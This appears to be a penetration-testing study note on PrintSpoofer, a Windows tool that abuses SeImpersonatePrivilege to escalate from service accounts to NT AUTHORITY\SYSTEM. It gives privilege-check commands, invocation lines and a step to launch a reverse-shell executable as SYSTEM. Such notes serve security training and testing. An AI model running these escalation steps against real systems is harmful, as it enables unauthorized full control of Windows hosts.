# PrintSpoofer

**PrintSpoofer** is a Windows Privilege Escalation tool used to exploit:

```
SeImpersonatePrivilege
```

to obtain:

```
NT AUTHORITY\SYSTEM
```

---

# What is the idea?

In Windows, some service accounts have a privilege called:

```
SeImpersonatePrivilege
```

This allows a process to:

```
Impersonate another user token
```

Attackers can abuse this privilege to impersonate:

```
SYSTEM account
```

and escalate privileges.

---

# When is it useful?

Usually after getting a shell as:

```
www-data
IIS APPPOOL
NETWORK SERVICE
LOCAL SERVICE
```

or any user that has:

```
SeImpersonatePrivilege
```

---

# Check the privilege

In Meterpreter:

```
getprivs
```

or in Windows:

```
whoami /priv
```

Look for:

```
SeImpersonatePrivilege
```

Example:

```
Privilege Name                  State
========================================
SeImpersonatePrivilege          Enabled
```

---

# Basic Usage

Example:

```
PrintSpoofer.exe -i -c cmd
```

Meaning:

- `-i` → Interactive shell
- `-c` → Command to execute

Result:

```
C:\Windows\system32> whoami
nt authority\system
```

---

# Execute PowerShell

```
PrintSpoofer.exe -i -c powershell.exe
```

---

# Reverse Shell Example

You can execute a reverse shell payload:

```
PrintSpoofer.exe -c "C:\Temp\shell.exe"
```

---

# How the attack works (simple)

Before:

```
Low Privileged User
        |
        |
        v
NETWORK SERVICE
```

After exploiting:

```
NETWORK SERVICE
        |
        |
        v
NT AUTHORITY\SYSTEM
```

---

# Requirements

PrintSpoofer usually requires:

- Windows system
- User has `SeImpersonatePrivilege`
- Named Pipe impersonation vulnerability

Common targets:

- Windows Server
- IIS servers
- Services running with impersonation privileges

---

# Related Tools

Other tools using the same idea:

|Tool|Purpose|
|---|---|
|PrintSpoofer|SeImpersonatePrivilege abuse|
|JuicyPotato|Older Potato exploit|
|RoguePotato|Alternative Potato exploit|
|GodPotato|Newer Windows versions|

---

# In short:

```
PrintSpoofer = Privilege Escalation tool that abuses SeImpersonatePrivilege to get SYSTEM privileges.
```

The common workflow:

```
Get Shell
    |
Check Privileges
    |
Find SeImpersonatePrivilege
    |
Run PrintSpoofer
    |
SYSTEM Shell
```